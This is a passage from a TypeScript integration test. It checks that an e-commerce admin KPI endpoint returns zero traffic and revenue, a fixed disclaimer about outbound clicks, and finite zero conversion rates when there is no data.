      db.prepare('DELETE FROM enquiries').run();

      const startUtc = '2026-01-01T00:00:00.000Z';
      const endUtc = '2026-01-31T23:59:59.999Z';

      const res = await fetch(`${baseUrl}/api/admin/overview/kpis?start=${encodeURIComponent(startUtc)}&end=${encodeURIComponent(endUtc)}`, {
        headers: { Cookie: adminCookie }
      });

      expect(res.status).toBe(200);
      const json = await res.json();

      // Check traffic counts are zero
      expect(json.traffic.total_product_views).toBe(0);
      expect(json.traffic.unique_visitors).toBe(0);
      expect(json.traffic.product_card_clicks).toBe(0);
      expect(json.traffic.product_impressions).toBe(0);
      expect(json.traffic.detail_views).toBe(0);

      // Check revenue is zero
      expect(json.revenue.verified_revenue_paise).toBe(0);
      expect(json.revenue.formatted).toBe('₹0');

      // Check mandatory disclaimer is present verbatim
      expect(json.outbound_engagement.unverified_disclaimer).toBe(
        "Outbound Amazon and WhatsApp clicks represent high purchase intent; final checkout happens externally and is classified as 'Purchase Outcome Unknown'."
      );

      // Verify each conversion rate object under zero denominator
      const conversionRates = json.conversion_rates;
      expect(Array.isArray(conversionRates)).toBe(true);
      expect(conversionRates).toHaveLength(4);

      for (const cr of conversionRates) {
        // Zero denominator must yield 0.0 (or 0), never NaN, Infinity, -Infinity, or null
        expect(typeof cr.rate_percentage).toBe('number');
        expect(Number.isNaN(cr.rate_percentage)).toBe(false);
        expect(Number.isFinite(cr.rate_percentage)).toBe(true);
        expect(cr.rate_percentage).toBe(0);
        expect(cr.denominator).toBe(0);
        expect(cr.numerator).toBe(0);
      }

      // Verify specific metric names
      const metricNames = conversionRates.map((c: any) => c.metric);
      expect(metricNames).toContain('Storefront to Enquiry Conversion Rate');
      expect(metricNames).toContain('Product Detail to Outbound Intent Rate');
      expect(metricNames).toContain('Discovery Click-Through Rate (CTR)');
      expect(metricNames).toContain('Enquiry Form Completion Rate');
    });
  });
});
